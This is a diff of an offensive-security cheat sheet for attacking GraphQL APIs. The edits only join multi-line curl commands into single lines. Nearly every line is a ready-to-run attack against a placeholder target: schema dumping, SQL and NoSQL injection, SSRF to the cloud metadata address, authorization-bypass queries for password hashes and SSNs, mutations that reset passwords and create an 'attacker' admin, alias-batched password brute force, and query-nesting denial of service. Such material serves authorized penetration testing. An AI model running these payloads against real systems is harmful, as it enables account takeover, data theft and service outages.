@@ -8,16 +8,13 @@ GraphQL — single-endpoint query language API. Uses queries (read), mutations (
 
 ```bash
 # Common GraphQL endpoints
-for path in /graphql /api/graphql /graphql/v1 /v1/graphql /api/v1/graphql \
-            /query /api/query /gql /console /graphiql /playground; do
+for path in /graphql /api/graphql /graphql/v1 /v1/graphql /api/v1/graphql /query /api/query /gql /console /graphiql /playground; do
   code=$(curl -so /dev/null -w "%{http_code}" "http://<target>$path")
   echo "$path: $code"
 done
 
 # POST probe — minimal query
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __typename }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
 # Returns: {"data":{"__typename":"Query"}} → GraphQL confirmed
 
 # GET probe (some endpoints accept GET)
@@ -30,17 +27,12 @@ curl -s "http://<target>/graphql?query=%7B__typename%7D"
 
 ```bash
 # Full introspection query
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
   "query": "{ __schema { queryType { name } mutationType { name } types { kind name fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
 }'
 
 # Cleaner — save full introspection to file
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"fragment FullType on __Type { kind name fields(includeDeprecated:true) { name args { name type { ...TypeRef } } type { ...TypeRef } } inputFields { name type { ...TypeRef } } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name } possibleTypes { ...TypeRef } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name locations args { name type { ...TypeRef } } } } }"}' \
-  | python3 -m json.tool > schema.json
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"fragment FullType on __Type { kind name fields(includeDeprecated:true) { name args { name type { ...TypeRef } } type { ...TypeRef } } inputFields { name type { ...TypeRef } } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name } possibleTypes { ...TypeRef } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name locations args { name type { ...TypeRef } } } } }"}' | python3 -m json.tool > schema.json
 
 # Parse schema for queries and mutations
 python3 << 'EOF'
@@ -68,28 +60,18 @@ EOF
 
 ```bash
 # List users (common query name guesses)
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ users { id username email role password } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ users { id username email role password } }"}'
 
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ allUsers { id name email isAdmin } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ allUsers { id name email isAdmin } }"}'
 
 # Query with variable
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"query GetUser($id: ID!) { user(id: $id) { id username email role } }","variables":{"id":"1"}}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"query GetUser($id: ID!) { user(id: $id) { id username email role } }","variables":{"id":"1"}}'
 
 # Mutation — change password
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { updatePassword(userId: \"1\", newPassword: \"hacked\") { success } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { updatePassword(userId: \"1\", newPassword: \"hacked\") { success } }"}'
 
 # Mutation — create admin user
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { createUser(username: \"attacker\", password: \"P@ss!\", role: \"admin\") { id } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { createUser(username: \"attacker\", password: \"P@ss!\", role: \"admin\") { id } }"}'
 ```
 
 ---
@@ -100,22 +82,16 @@ When introspection is blocked, use field name suggestions (GraphQL returns "Did 
 
 ```bash
 # Trigger suggestion by sending near-miss field name
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ usr { id } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}'
 # Error: "Did you mean user?" → reveals valid field name
 
 # Clairvoyance — brute-force schema via suggestions
 pip3 install clairvoyance
-clairvoyance -u "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -o schema.json
+clairvoyance -u "http://<target>/graphql" -H "Content-Type: application/json" -o schema.json
 
 # Manual field guessing
 for field in user users admin getUser allUsers listUsers profile me account; do
-  result=$(curl -s -X POST "http://<target>/graphql" \
-    -H "Content-Type: application/json" \
-    -d "{\"query\":\"{ $field { id } }\"}")
+  result=$(curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d "{\"query\":\"{ $field { id } }\"}")
   echo "$field: $(echo $result | python3 -m json.tool 2>/dev/null | grep -i 'error\|data' | head -1)"
 done
 ```
@@ -128,50 +104,35 @@ done
 
 ```bash
 # Inject SQLi in query arguments
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username email } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username email } }"}'
 
 # UNION injection
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: \"1 UNION SELECT 1,username,password,4 FROM users-- -\") { id username email } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 UNION SELECT 1,username,password,4 FROM users-- -\") { id username email } }"}'
 
 # Time-based blind
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: \"1; SELECT SLEEP(5)-- -\") { id } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1; SELECT SLEEP(5)-- -\") { id } }"}'
 
 # Send to sqlmap via Burp request file
 # Save POST request to file, then:
-sqlmap -r graphql_request.txt --level 5 --risk 3 --batch \
-  --data '{"query":"{ user(id: \"*\") { id } }"}'
+sqlmap -r graphql_request.txt --level 5 --risk 3 --batch --data '{"query":"{ user(id: \"*\") { id } }"}'
 ```
 
 ### NoSQL Injection via GraphQL
 
 ```bash
 # MongoDB operator injection
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(username: {\"$regex\": \".*\"}) { id username password } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(username: {\"$regex\": \".*\"}) { id username password } }"}'
 
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ login(username: \"admin\", password: {\"$gt\": \"\"}) { token } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ login(username: \"admin\", password: {\"$gt\": \"\"}) { token } }"}'
 ```
 
 ### SSRF via GraphQL
 
 ```bash
 # If there's a URL/import/webhook query
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}'
 
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { fetchUrl(url: \"http://127.0.0.1:8080/admin\") { content } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { fetchUrl(url: \"http://127.0.0.1:8080/admin\") { content } }"}'
 ```
 
 ---
@@ -180,27 +141,16 @@ curl -s -X POST "http://<target>/graphql" \
 
 ```bash
 # IDOR — access other users' data
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <your-token>" \
-  -d '{"query":"{ user(id: \"1\") { id username email secretKey } }"}'  # admin user
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <your-token>" -d '{"query":"{ user(id: \"1\") { id username email secretKey } }"}'  # admin user
 
 # Object-level auth bypass — directly query restricted type
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <low-priv-token>" \
-  -d '{"query":"{ adminPanel { users { id username passwordHash } } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <low-priv-token>" -d '{"query":"{ adminPanel { users { id username passwordHash } } }"}'
 
 # Field-level bypass — request sensitive fields not shown in UI
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <token>" \
-  -d '{"query":"{ me { id username email password apiKey creditCard ssn } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"query":"{ me { id username email password apiKey creditCard ssn } }"}'
 
 # Unauthenticated mutation
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { resetPassword(email: \"admin@target.com\") { success token } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { resetPassword(email: \"admin@target.com\") { success token } }"}'
 ```
 
 ---
@@ -233,9 +183,7 @@ for i, result in enumerate(r.json()):
 EOF
 
 # Alias batching (non-array format — works when array batching disabled)
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
   "query": "{ a: login(username:\"admin\",password:\"password\") { token } b: login(username:\"admin\",password:\"123456\") { token } c: login(username:\"admin\",password:\"admin\") { token } }"
 }'
 ```
@@ -246,19 +194,13 @@ curl -s -X POST "http://<target>/graphql" \
 
 ```bash
 # Deep nesting attack (if no depth limit)
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}'
 
 # Field duplication (if no complexity limit)
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user { id id id id id id id id id id id id id id id id id id id id } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user { id id id id id id id id id id id id id id id id id id id id } }"}'
 
 # Introspection DoS — if server doesn't cache schema resolution
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}'
 ```
 
 ---
@@ -295,27 +237,17 @@ graphql-cop -t http://<target>/graphql
 
 ```bash
 # Confirm GraphQL
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __typename }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
 
 # Dump schema
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { types { name kind fields { name } } } }"}' | python3 -m json.tool
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name kind fields { name } } } }"}' | python3 -m json.tool
 
 # List all queries
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
 
 # List all mutations
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ __schema { mutationType { fields { name description args { name } } } } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { mutationType { fields { name description args { name } } } } }"}'
 
 # SQLi test
-curl -s -X POST "http://<target>/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username } }"}'
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username } }"}'
 ```
